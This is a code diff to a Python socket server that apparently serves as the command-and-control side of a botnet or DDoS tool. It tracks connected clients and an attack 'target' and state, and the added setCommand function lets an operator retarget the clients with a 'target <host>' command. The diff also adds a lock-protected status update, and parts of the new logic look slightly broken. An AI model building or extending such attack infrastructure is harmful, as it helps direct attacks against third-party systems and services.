@@ -28,6 +28,8 @@ def acceptor(s: socket.socket):
             print("currently handling", active_connections, "connections")
             client_thread = threading.Thread(target=handle_client, args=(connection, address))
             client_thread.start()
+            with conn_dict_lock:
+                conn_dict[conn_name] = "stopped"
             print(conn_dict)
         except socket.timeout:  
             # use periodic time outs to check if the user has pressed ctrl+c, 
@@ -100,6 +102,16 @@ def getAttackDetails():
         state = "Attacking"
     return {"target": target, "num_conns": active_connections, "conns": conn_list, "state": state}
 
+
+def setCommand(cmd: str):
+    global command
+    global target
+    command = cmd
+    if command.split(' ')[0] == "target":
+        target = command.split(' ')[1]
+        print(command.split(' ')[0])
+    ret_msg = "Command set to", command
+    return ret_msg
 
 def main():
     global target
